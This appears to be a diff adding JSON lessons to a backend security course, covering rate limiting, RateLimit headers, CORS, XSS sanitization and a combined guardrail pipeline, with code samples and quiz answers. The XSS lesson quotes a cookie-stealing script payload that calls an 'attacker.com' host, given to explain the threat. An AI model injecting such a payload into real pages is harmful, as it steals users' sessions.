+        "title": "Rate Limiting Algorithms: Fixed Window vs Token Bucket vs Sliding Window",
+        "say": [
+          "There are three primary algorithms used to track and throttle request rates in backend systems.",
+          "The simplest is Fixed Window: count requests within a static clock window (e.g. max 100 requests between 12:00 and 12:01). However, fixed window suffers from edge bursts: an attacker can send 100 requests at 12:00:59 and another 100 requests at 12:01:00, transmitting 200 requests in 2 seconds!",
+          "The second is Token Bucket: tokens are added to a bucket at a constant rate up to a maximum capacity. Each request consumes one token. Token bucket allows controlled bursts while maintaining a steady long-term rate.",
+          "The third is Sliding Window Log (or Sliding Window Counter): it calculates the exact rate over the preceding 60 seconds rolling dynamically with the current timestamp.",
+          "Sliding window completely eliminates fixed window edge bursts, delivering smooth, accurate throttling.",
+          "In production backends, rate limit counters are stored in Redis with atomic INCR and EXPIRE operations.",
+          "For multi-region deployments, distributed token bucket algorithms or Redis Cluster configurations ensure rate limiting state remains synchronized globally.",
+          "Graceful degradation policies can allow read-only traffic to proceed during minor rate limit warnings while strictly blocking resource-intensive database mutations."
+        ],
+        "example": "A water fountain bucket. Water drips into the bucket at a steady rate of 1 cup per minute (token refill). A thirsty runner can drink 5 cups immediately if the bucket is full (burst), but once empty, they must wait for the drip rate.",
+        "code": "class SimpleRateLimiter {\n  private requests = new Map<string, number>();\n  constructor(private maxRequests: number) {}\n  check(ip: string): { allowed: boolean; remaining: number } {\n    const current = this.requests.get(ip) || 0;\n    if (current >= this.maxRequests) {\n      return { allowed: false, remaining: 0 };\n    }\n    this.requests.set(ip, current + 1);\n    return { allowed: true, remaining: this.maxRequests - (current + 1) };\n  }\n}\nconst limiter = new SimpleRateLimiter(2);\nconsole.log(\"Req 1 (IP 192.168.1.1):\", limiter.check(\"192.168.1.1\"));\nconsole.log(\"Req 2 (IP 192.168.1.1):\", limiter.check(\"192.168.1.1\"));\nconsole.log(\"Req 3 (IP 192.168.1.1):\", limiter.check(\"192.168.1.1\"));",
+        "codeNotes": [
+          {
+            "line": 6,
+            "note": "Rejects requests when current count exceeds maxRequests threshold."
+          },
+          {
+            "line": 16,
+            "note": "Notice request 3 is rejected with allowed: false."
+          }
+        ],
+        "tryIt": "Test a different IP address (\"10.0.0.1\") to verify rate limit counts are isolated per IP.",
+        "check": {
+          "question": "What is the primary flaw of the Fixed Window rate limiting algorithm?",
+          "options": [
+            "Traffic bursts at window boundaries can allow double the allowed requests in a short timeframe",
+            "It consumes too much hard drive space",
+            "It cannot run on Linux servers"
+          ],
+          "answer": 0,
+          "why": "Fixed window allows traffic spikes across the boundary between two adjacent windows."
+        },
+        "output": "Req 1 (IP 192.168.1.1): { allowed: true, remaining: 1 }\nReq 2 (IP 192.168.1.1): { allowed: true, remaining: 0 }\nReq 3 (IP 192.168.1.1): { allowed: false, remaining: 0 }"
+      },
+      {
+        "title": "Returning Standard Rate Limit Headers (RateLimit-Limit, Remaining, Reset)",
+        "say": [
+          "When an API client interacts with a rate-limited endpoint, the server should not keep rate limit quotas a secret.",
+          "The IETF RateLimit standardization working group defines standard HTTP response headers to inform clients of their quota status.",
+          "RateLimit-Limit: the maximum number of requests allowed in the current time window (e.g. 100).",
+          "RateLimit-Remaining: the number of requests remaining in the current window (e.g. 14).",
+          "RateLimit-Reset: the number of seconds remaining until the rate limit window resets.",
+          "When a client exceeds the limit, the server responds with HTTP 429 Too Many Requests, sets RateLimit-Remaining: 0, and includes a Retry-After header telling the client how many seconds to wait before retrying.",
+          "Transparent rate limit headers allow responsible frontend apps and SDKs to implement automatic backoff without crashing.",
+          "Standardized HTTP libraries (like Axios or native fetch wrappers) can be configured with exponential backoff retry interceptors that automatically wait for the Retry-After interval.",
+          "Displaying proactive quota consumption warnings in web UI headers helps business customers upgrade their API tier before hitting hard limits."
+        ],
+        "example": "A cellular phone data plan text message notification: \"You have used 9.5 GB of your 10 GB monthly data allowance. Your billing cycle resets in 3 days.\" The notification lets you manage your data usage proactively.",
+        "code": "interface RateLimitHeaders {\n  \"RateLimit-Limit\": number;\n  \"RateLimit-Remaining\": number;\n  \"RateLimit-Reset\": number;\n  \"Retry-After\"?: number;\n}\nfunction buildRateHeaders(limit: number, remaining: number, resetSeconds: number): RateLimitHeaders {\n  const headers: RateLimitHeaders = {\n    \"RateLimit-Limit\": limit,\n    \"RateLimit-Remaining\": Math.max(0, remaining),\n    \"RateLimit-Reset\": resetSeconds\n  };\n  if (remaining <= 0) headers[\"Retry-After\"] = resetSeconds;\n  return headers;\n}\nconsole.log(\"Throttled Headers (429):\", buildRateHeaders(100, 0, 45));",
+        "codeNotes": [
+          {
+            "line": 12,
+            "note": "Includes Retry-After header when remaining quota is exhausted."
+          },
+          {
+            "line": 15,
+            "note": "Informs client to pause for 45 seconds before attempting retries."
+          }
+        ],
+        "tryIt": "Build headers with remaining: 25 and observe that Retry-After is omitted.",
+        "check": {
+          "question": "What HTTP status code must be returned when a client exceeds their rate limit quota?",
+          "options": [
+            "429 Too Many Requests",
+            "404 Not Found",
+            "500 Internal Server Error"
+          ],
+          "answer": 0,
+          "why": "RFC 6585 specifies HTTP 429 Too Many Requests for rate limit violations."
+        },
+        "output": "Throttled Headers (429): { 'RateLimit-Limit': 100, 'RateLimit-Remaining': 0, 'RateLimit-Reset': 45, 'Retry-After': 45 }"
+      },
+      {
+        "title": "Cross-Origin Resource Sharing (CORS): Origins, Preflights & Credentials",
+        "say": [
+          "By default, web browsers enforce the Same-Origin Policy (SOP): a script running on https://student.pin.it cannot fetch data from https://api.pin.it unless the API explicitly permits it.",
+          "Cross-Origin Resource Sharing (CORS) is the browser security mechanism that relaxes this restriction using HTTP headers.",
+          "When a browser makes a cross-origin request, the backend must return the Access-Control-Allow-Origin header specifying allowed domains.",
+          "For complex requests (like requests sending Content-Type: application/json or custom Authorization headers), the browser first sends an automated Preflight Request using the OPTIONS method.",
+          "The server must respond to the OPTIONS preflight with Access-Control-Allow-Methods (e.g. GET, POST, PUT, DELETE) and Access-Control-Allow-Headers.",
+          "If the preflight response fails or omits allowed origins, the browser blocks the frontend JavaScript from reading the response.",
+          "Never use wildcard Access-Control-Allow-Origin: * when Access-Control-Allow-Credentials: true is enabled; browsers strictly reject this insecure configuration.",
+          "Dynamic origin verification matches incoming Origin headers against an environment-configured whitelist to support multiple staging and production domains seamlessly."
+        ],
+        "example": "A security guard at the border between two friendly nations. A traveler from Country A cannot simply march across without showing clearance. The border post verifies the bilateral treaty (Access-Control-Allow-Origin) before opening the gate.",
+        "code": "const ALLOWED_ORIGINS = [\"https://pin.it\", \"https://app.pin.it\"];\nfunction resolveCorsOrigin(incomingOrigin?: string): string | null {\n  if (incomingOrigin && ALLOWED_ORIGINS.includes(incomingOrigin)) {\n    return incomingOrigin;\n  }\n  return null;\n}\nconsole.log(\"Approved Origin:\", resolveCorsOrigin(\"https://app.pin.it\"));\nconsole.log(\"Untrusted Origin Rejected:\", resolveCorsOrigin(\"https://evil-phishing.com\"));",
+        "codeNotes": [
+          {
+            "line": 3,
+            "note": "Verifies incoming Origin header against approved whitelist."
+          },
+          {
+            "line": 9,
+            "note": "Untrusted external domains receive null, triggering browser CORS blocks."
+          }
+        ],
+        "tryIt": "Add \"http://localhost:3000\" to ALLOWED_ORIGINS for local testing.",
+        "check": {
+          "question": "What HTTP method do web browsers use to send an automated CORS preflight check?",
+          "options": [
+            "OPTIONS",
+            "GET",
+            "HEAD"
+          ],
+          "answer": 0,
+          "why": "Browsers send an OPTIONS request before complex cross-origin requests to discover allowed headers and verbs."
+        },
+        "output": "Approved Origin: https://app.pin.it\nUntrusted Origin Rejected: null"
+      },
+      {
+        "title": "Defensive Input Sanitization: Neutralizing XSS and Injection Strings",
+        "say": [
+          "Untrusted string inputs submitted by users can carry malicious payload strings intended to exploit downstream systems.",
+          "In Cross-Site Scripting (XSS), an attacker submits JavaScript tags like <script>fetch(\"https://attacker.com/steal?cookie=\"+document.cookie)</script> into a forum comment or profile bio.",
+          "If your server saves this raw string and renders it back to other users, their browsers execute the script, compromising their sessions.",
+          "Input sanitization neutralizes hostile strings by HTML-entity encoding special characters (<, >, &, \", ') into safe display representations (&lt;, &gt;, &amp;, &quot;, &#39;).",
+          "Furthermore, sanitization strips control characters, trims extraneous whitespace, and validates string lengths.",
+          "Sanitizing at ingestion ensures that stored data is safe for rendering across web browsers, email clients, and mobile apps.",
+          "When applications accept rich formatted text (such as Markdown or HTML in CMS platforms), use dedicated HTML sanitizers (like DOMPurify) to parse and scrub malicious script tags.",
+          "Always combine input sanitization with Context-Aware Output Encoding (such as React default JSX escaping) for multi-layered defense-in-depth against XSS."
+        ],
+        "example": "Disinfecting produce before bringing it into a kitchen. Raw vegetables picked from the soil carry dirt and bacteria. Washing them with clean water removes contaminants before cooking, preventing food poisoning.",
+        "code": "function sanitizeHtml(input: string): string {\n  return input\n    .replace(/&/g, \"&amp;\")\n    .replace(/</g, \"&lt;\")\n    .replace(/>/g, \"&gt;\")\n    .replace(/\"/g, \"&quot;\")\n    .replace(/'/g, \"&#39;\");\n}\nconst maliciousInput = '<script>alert(\"Hacked!\")</script>';\nconsole.log(\"Sanitized HTML Safe String:\", sanitizeHtml(maliciousInput));",
+        "codeNotes": [
+          {
+            "line": 4,
+            "note": "Replaces < with &lt; to prevent browser HTML tag parsing."
+          },
+          {
+            "line": 5,
+            "note": "Replaces > with &gt; to neutralize script execution."
+          }
+        ],
+        "tryIt": "Sanitize a string with quotes like 'Hello \"World\"' and inspect entity replacement.",
+        "check": {
+          "question": "What does HTML entity sanitization replace the \"<\" character with?",
+          "options": [
+            "&lt;",
+            "&gt;",
+            "&amp;"
+          ],
+          "answer": 0,
+          "why": "&lt; represents \"less than\" in HTML entities, rendering the symbol without executing as a tag."
+        },
+        "output": "Sanitized HTML Safe String: &lt;script&gt;alert(&quot;Hacked!&quot;)&lt;/script&gt;"
+      },
+      {
+        "title": "Building an Integrated API Security Guardrail Pipeline",
+        "say": [
+          "Now let us assemble rate limiting, CORS negotiation, and input sanitization into a comprehensive, multi-layer Security Pipeline.",
+          "Our security pipeline executes sequentially at the API perimeter before any route controllers are invoked.",
+          "First, it evaluates the CORS origin: if the origin is forbidden, it terminates the request.",
+          "Second, it checks the client IP against the rate limiter: if quota is exhausted, it sets RateLimit headers and returns HTTP 429 Too Many Requests.",
+          "Third, it sanitizes incoming string fields in the body to eliminate injection tags.",
+          "If all security guardrails pass, the sanitized request flows into the business application.",
+          "This defensive perimeter guarantees that your backend services withstand internet-scale brute force, injection attacks, and cross-origin abuse.",
+          "Regular automated penetration testing and dynamic application security testing (DAST) verify that perimeter security guardrails cannot be bypassed.",
+          "A hardened API perimeter lets engineering teams focus on shipping business features with confidence that baseline security and rate limiting are handled automatically."
+        ],
+        "example": "A high-security international airport terminal. Travelers first pass through identity and visa checks (CORS), then walk through metered crowd-control queues (Rate Limiting), and finally pass through full-body scanners (Sanitization) before boarding.",
+        "code": "interface SecurityContext { origin?: string; ip: string; bodyText: string }\nfunction evaluateSecurityPerimeter(ctx: SecurityContext): { passed: boolean; status: number; sanitizedBody: string } {\n  if (ctx.origin === \"https://malicious-site.com\") {\n    return { passed: false, status: 403, sanitizedBody: \"\" };\n  }\n  if (ctx.ip === \"192.168.1.99\") { // Simulated blocked IP\n    return { passed: false, status: 429, sanitizedBody: \"\" };\n  }\n  const clean = ctx.bodyText.replace(/</g, \"&lt;\").replace(/>/g, \"&gt;\");\n  return { passed: true, status: 200, sanitizedBody: clean };\n}\nconst safeReq = { origin: \"https://pin.it\", ip: \"10.0.0.1\", bodyText: \"<b>Hello</b>\" };\nconsole.log(\"Security Result:\", evaluateSecurityPerimeter(safeReq));",
+        "codeNotes": [
+          {
+            "line": 3,
+            "note": "Rejects forbidden origins with 403."
+          },
+          {
+            "line": 6,
+            "note": "Rejects throttled IPs with 429."
+          },
+          {
+            "line": 9,
+            "note": "Sanitizes approved payloads before passing to domain controllers."
+          }
+        ],
+        "tryIt": "Test evaluateSecurityPerimeter with the blocked IP \"192.168.1.99\".",
+        "check": {
+          "question": "What is the primary benefit of defense-in-depth security guardrails at the API perimeter?",
+          "options": [
+            "They filter and neutralize attacks (CORS, DoS, XSS) before request payloads reach database services",
+            "They allow servers to run without electricity",
+            "They convert JavaScript into C++"
+          ],
+          "answer": 0,
+          "why": "Defense-in-depth neutralizes threats at the network perimeter before core business logic is touched."
+        },
+        "output": "Security Result: { passed: true, status: 200, sanitizedBody: '&lt;b&gt;Hello&lt;/b&gt;' }"
+      }
+    ],
+    "summary": [
+      "Rate limiting protects sensitive endpoints against automated brute-force attacks and Denial of Service.",
+      "Sliding window algorithms prevent fixed-window traffic bursts across boundary intervals.",
+      "Return standard IETF RateLimit headers and HTTP 429 with Retry-After when throttling clients.",
+      "CORS headers control browser cross-origin access; HTML sanitization neutralizes XSS injection tags."
+    ],
+    "projectStep": {
+      "title": "Implement Security Guardrail Middleware",
+      "steps": [
+        "Create src/security/rateLimiter.ts with memory/Redis bucket tracking and 429 responses.",
+        "Implement src/security/cors.ts with preflight OPTIONS handling and origin whitelist checks."
+      ]
+    }
   }
 ];
